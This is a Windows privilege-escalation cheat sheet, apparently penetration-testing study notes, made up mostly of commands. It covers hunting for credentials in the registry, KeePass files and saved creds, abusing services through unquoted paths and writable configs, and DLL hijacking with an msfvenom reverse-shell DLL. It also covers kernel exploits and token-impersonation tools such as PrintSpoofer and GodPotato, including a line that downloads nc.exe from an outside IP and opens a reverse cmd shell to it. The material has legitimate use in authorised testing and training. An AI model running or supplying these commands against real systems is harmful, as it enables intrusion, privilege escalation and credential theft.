### System and User Enumeration

```
#User
whoami /priv
net user <username>

#System
systeminfo
ipconfig
netstat -ano
```

### Search for Information
##### Searching Folders

```
#Specific File Types
Get-ChildItem -Path C:\<folder>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini, *bk, *backup*, -File -Recurse -ErrorAction SilentlyContinue

#All Files in Folder
Get-ChildItem -Path C:\<folder>\ -File -Recurse -ErrorAction SilentlyContinue

#Specific file name
Get-ChildItem -Path C:\ -Filter '<filename>' -File -Recurse -ErrorAction SilentlyContinue

#Keepass Database
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
##### Searching History
```
Get-History
(Get-PSReadlineOption).HistorySavePath
```
### Automation
```
winPEAs
ADPEAs
```
### Services
##### Running Services
```
#Services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

$AutoRun Services
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.StartMode -like 'Auto'}
```

##### Unquoted Service Paths
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

Get-WmiObject -Class Win32_Service | Where-Object { $_.State -eq 'Running' -and $_.PathName -notlike '*"*' } | Select-Object Name, PathName
```

##### Scheduled Tasks
```
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
```

##### Startup Apps

```
#If we can modify this directroy and add a shell. Then restart system.
 .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

##### Shutting Down System
```
#Check SeShutdownPrivilege enabled
whoami /priv  

#Shuts system down
shutdown /r /t 0
```

##### Checking Permissions
```
#Check file and folder
icacls "C:\<service.exe>"
icacls "C:\<folder>\"

#check service start / stop
net stop <service_name>
Stop-Service <service_name>
```

##### Service Configuration Writable
```
#See configuration
sc.exe qc <service_name>

#Modify Configuration
sc.exe config <service_name> <option>= <value>
```
##### DLL Hijacking
```
1. Check can service be stopped and started.
2. Copy the service executable to your host and use ProcMon to monitor what DLLs the executable tries to run.
	Filter NAME NOT FOUND
	Filter .DLL
3. Check folder or path it is searching is writable.
4. Upload malicious executable. (msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o /tools/hijackme.dll)
5. Restart the service.
```

### Kernel Exploits

```
Methodology
1. Enumerate Windows version / patch level. (systeminfo)
2. Find matching exploits. (Google, ExploitDB, GitHub)
3. Compile and run.

Tools
- Windows Exploit Suggester - wesng
- Precompiled Kernel Exploits - SecWiki
- Watson - rasta-mouse

Notes
- Be careful these can be unstable and may crash the system.
```


### Passwords

##### Registry

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

##### Saved Creds
```
cmdkey /list
run as /savecred /user:<username> <reverse_shell>
```

### Token Impersonation

##### Printer Spoofer

```
.\PrintSpoofer64.exe -i -c powershell.exe
https://github.com/itm4n/PrintSpoofer
```

##### Potato Exploits

```
#GodPotato
iwr -uri http://192.168.45.217:81/nc.exe -Outfile nc.exe
.\GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.217 4444"
```
[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)

Windows Server 2022

- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato)